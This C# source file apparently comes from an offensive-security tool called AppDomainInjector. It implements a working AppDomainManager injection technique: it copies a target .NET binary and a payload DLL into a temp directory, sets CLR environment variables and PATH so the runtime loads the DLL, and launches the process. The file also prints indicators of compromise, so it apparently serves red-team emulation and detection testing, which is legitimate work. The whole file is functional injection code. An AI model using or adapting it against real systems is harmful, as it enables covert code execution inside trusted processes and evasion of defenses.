using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using AppDomainInjector.Utils;

namespace AppDomainInjector.Techniques
{
    /// <summary>
    /// Implements AppDomainManager injection via environment variables.
    ///
    /// Technique:
    /// 1. Place payload DLL in accessible directory
    /// 2. Set APPDOMAIN_MANAGER_ASM and APPDOMAIN_MANAGER_TYPE environment variables
    /// 3. Set COMPLUS_Version to target CLR version
    /// 4. Execute target .NET process - CLR reads env vars and loads payload
    ///
    /// MITRE ATT&CK: T1574.001, T1055
    /// </summary>
    public class EnvVarHijack
    {
        private readonly string _targetBinary;
        private readonly string _payloadDllPath;
        private string _stagingDir;

        public EnvVarHijack(string targetBinary, string payloadDllPath)
        {
            _targetBinary = targetBinary;
            _payloadDllPath = payloadDllPath;
        }

        /// <summary>
        /// Executes the environment variable hijack technique.
        /// </summary>
        public bool Execute()
        {
            Console.WriteLine("\n[*] Executing Environment Variable Hijack technique...\n");

            try
            {
                // Step 1: Resolve target binary
                var binaryPath = BinaryLocator.ResolveBinaryPath(_targetBinary);
                if (binaryPath == null)
                {
                    Console.WriteLine($"[-] Target binary not found: {_targetBinary}");
                    return false;
                }
                Console.WriteLine($"[+] Target binary: {binaryPath}");

                // Step 2: Create staging directory for payload
                _stagingDir = Path.Combine(Path.GetTempPath(), "AppDomainInjector_" + Guid.NewGuid().ToString("N").Substring(0, 8));
                Directory.CreateDirectory(_stagingDir);
                Console.WriteLine($"[+] Staging directory: {_stagingDir}");

                // Step 3: Copy target binary to staging (CLR looks for assemblies relative to exe)
                var binaryName = Path.GetFileName(binaryPath);
                var stagedBinaryPath = Path.Combine(_stagingDir, binaryName);
                File.Copy(binaryPath, stagedBinaryPath, true);
                Console.WriteLine($"[+] Copied binary to staging: {stagedBinaryPath}");

                // Step 4: Copy payload DLL to staging
                var payloadName = Path.GetFileName(_payloadDllPath);
                var stagedPayloadPath = Path.Combine(_stagingDir, payloadName);
                File.Copy(_payloadDllPath, stagedPayloadPath, true);
                Console.WriteLine($"[+] Copied payload to staging: {stagedPayloadPath}");

                // Step 5: Get assembly information
                var assemblyName = AssemblyName.GetAssemblyName(stagedPayloadPath);
                var assemblyFullName = assemblyName.FullName;
                var managerTypeName = "Payload.Injector";

                Console.WriteLine($"[+] Assembly: {assemblyFullName}");
                Console.WriteLine($"[+] Manager Type: {managerTypeName}");

                // Step 6: Prepare process with environment variables
                Console.WriteLine($"\n[*] Setting environment variables and executing...\n");

                var psi = new ProcessStartInfo
                {
                    FileName = stagedBinaryPath,  // Execute from staging dir
                    UseShellExecute = false,
                    CreateNoWindow = false,
                    WorkingDirectory = _stagingDir
                };

                // Set the magic environment variables
                psi.EnvironmentVariables["APPDOMAIN_MANAGER_ASM"] = assemblyFullName;
                psi.EnvironmentVariables["APPDOMAIN_MANAGER_TYPE"] = managerTypeName;
                psi.EnvironmentVariables["COMPLUS_Version"] = "v4.0.30319";

                // Add staging directory to path for DLL resolution
                var currentPath = psi.EnvironmentVariables["PATH"] ?? "";
                psi.EnvironmentVariables["PATH"] = _stagingDir + ";" + currentPath;

                // For PowerShell, add simple command
                if (binaryName.Equals("powershell.exe", StringComparison.OrdinalIgnoreCase))
                {
                    psi.Arguments = "-NoProfile -Command \"Write-Host '[+] PowerShell loaded with injected AppDomainManager'; Start-Sleep 2; exit\"";
                }

                Console.WriteLine("[+] Environment variables set:");
                Console.WriteLine($"    APPDOMAIN_MANAGER_ASM  = {assemblyFullName}");
                Console.WriteLine($"    APPDOMAIN_MANAGER_TYPE = {managerTypeName}");
                Console.WriteLine($"    COMPLUS_Version        = v4.0.30319");

                using (var process = Process.Start(psi))
                {
                    Console.WriteLine($"\n[+] Started process: {process.Id} ({binaryName})");
                    process.WaitForExit(10000); // Wait max 10 seconds
                }

                Console.WriteLine("\n[+] Environment Variable Hijack technique executed successfully!");
                Console.WriteLine($"[*] Check if calc.exe was spawned to confirm payload execution.\n");

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\n[-] Environment Variable Hijack failed: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Cleans up staging directory.
        /// </summary>
        public void Cleanup()
        {
            if (!string.IsNullOrEmpty(_stagingDir) && Directory.Exists(_stagingDir))
            {
                try
                {
                    Directory.Delete(_stagingDir, true);
                    Console.WriteLine($"[+] Cleaned up staging directory: {_stagingDir}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Cleanup failed: {ex.Message}");
                }
            }
        }

        /// <summary>
        /// Prints IOCs generated by this technique.
        /// </summary>
        public void PrintIOCs()
        {
            Console.WriteLine("\n[*] IOCs Generated (Environment Variable Hijack):");
            Console.WriteLine("    - Process: APPDOMAIN_MANAGER_ASM environment variable set");
            Console.WriteLine("    - Process: APPDOMAIN_MANAGER_TYPE environment variable set");
            Console.WriteLine("    - Process: COMPLUS_Version environment variable set");
            Console.WriteLine("    - Event: ETW Microsoft-Windows-DotNETRuntime provider");
            Console.WriteLine("    - Event: Sysmon Event 1 (ProcessCreate) with env vars");
            Console.WriteLine("    - Event: Sysmon Event 7 (ImageLoad) for unsigned DLL");
        }
    }
}
